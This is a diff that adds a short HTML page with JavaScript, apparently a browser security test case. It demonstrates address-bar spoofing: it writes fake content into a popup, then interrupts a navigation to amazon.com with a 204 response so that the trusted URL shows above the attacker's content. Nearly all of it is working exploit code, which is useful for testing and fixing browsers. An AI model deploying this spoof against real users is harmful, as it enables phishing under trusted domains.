@@ -1,0 +1,44 @@
+
+<button onclick=startAttack()>Spoof</button><br>
+After clicking button, the spoofed content will go blank in 4 seconds.<br>
+Switch to this tab and then back to the popup tab to make it appear again.<br>
+
+<script>
+var w;
+var t;
+
+function startAttack() {
+  // Open popup with fake content.
+  w = window.open();
+  w.document.write("Fake content");
+
+  // Wait for URL to change, then redirect.
+  t = setInterval('redirect()', 1);
+}
+
+function redirect() {
+  if (w.location.href == 'about:blank')
+  	return;
+
+  alert("Switch back to opener tab before redirecting.");
+
+  w.location.href = 'https://www.amazon.com/';
+
+  clearInterval(t);
+
+  var i = setInterval(function () {
+    try {
+      // This will throw an exception after the popup commits amazon.com.
+      var x = w.location.href;
+    } catch (e) {
+      // Interrupt the load of amazon.com with a 204 response.
+      // If this is done quickly enough, nothing will paint.
+      w.location.href = 'https://www.google.com/csi';
+
+      // We're done.  Could show an alert to force the user to switch tabs.
+      clearInterval(i);
+    }
+  }, 1);
+}
+</script>
+
